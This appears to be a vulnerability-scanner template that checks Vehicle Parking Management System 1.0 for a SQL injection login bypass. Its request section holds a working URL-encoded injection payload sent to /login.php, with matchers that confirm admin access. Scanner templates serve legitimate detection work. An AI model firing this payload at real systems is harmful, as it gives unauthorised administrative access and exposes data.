id: vpms-auth-bypass
info:
  name: Vehicle Parking Management System 1.0 - SQL Injection
  author: dwisiswant0
  severity: critical
  description: vpms-auth-bypass is a security vulnerability in Vehicle Parking Management
    System 1.0 that allows unauthorized access to sensitive information and admin
    privileges through SQL injection.
  reference:
  - https://www.exploit-db.com/exploits/48877
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: auth-bypass,edb
  metadata:
    impact: The SQL injection vulnerability in Vehicle Parking Management System 1.0
      has the potential to compromise sensitive information and allow for unauthorized
      administrative operations.
    recommendation: It is highly recommended to implement appropriate measures to
      fix the SQL injection vulnerability in Vehicle Parking Management System 1.0
      to prevent unauthorized access and manipulation of sensitive data.
requests:
- raw:
  - 'POST /login.php HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}/login.php

    Cookie: PHPSESSID=q4efk7p0vo1866rwdxzq8aeam8


    email=%27%3D%27%27or%27%40email.com&password=%27%3D%27%27or%27&btn_login=1

    '
  matchers-condition: and
  matchers:
  - type: word
    words:
    - LAGOS PARKER
    - Login Successfully
    - location.href = 'index.php';
    condition: and
    part: body
  - type: status
    status:
    - 200
